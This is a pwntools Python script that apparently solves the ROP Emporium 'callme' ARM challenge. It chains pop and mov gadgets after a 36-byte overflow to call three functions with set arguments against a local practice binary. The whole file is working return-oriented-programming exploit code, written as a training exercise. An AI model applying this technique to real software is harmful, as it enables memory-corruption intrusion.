from pwn import *

context.arch = 'arm'
prog = process("./callme_armv5")

# note that r3 needs the LSB to be 1 or it will not branch
# 0x000108b0: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
mov_0 = p32(0x000108b0)

# 0x000108c8: pop {r4, r5, r6, r7, r8, sb, sl, pc}
pop_0 = p32(0x000108c8)
# 0x000105dc: pop {r3, pc};
pop_1 = p32(0x000105dc)

# argument 1
arg_0 = p32(0xdeadbeef)
# argument 2
arg_1 = p32(0xcafebabe)
# argument 3
arg_2 = p32(0xd00df00d)

# callme_one()
func_callme_one = p32(0x00010618)
# callme_two()
func_callme_two = p32(0x0001066c)
# callme_three()
func_callme_three = p32(0x0001060c)

payload = b'a' * 36

payload += pop_1
payload += pop_1

payload += pop_0
payload += b'b'*4 + b'c'*4 + b'd'*4
payload += arg_0
payload += arg_1
payload += arg_2
payload += b'e'*4
payload += mov_0

# temp work
payload += pop_1
payload += func_callme_one

# payload += pop_1
payload += func_callme_two

payload += pop_0
payload += b'f'*4 + b'g'*4 + b'h'*4
payload += arg_0
payload += arg_1
payload += arg_2
payload += b'i'*4
payload += mov_0

payload += pop_1
payload += func_callme_three

payload += pop_0
payload += b'j'*4 + b'k'*4 + b'l'*4
payload += arg_0
payload += arg_1
payload += arg_2
payload += b'm'*4
payload += mov_0

print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
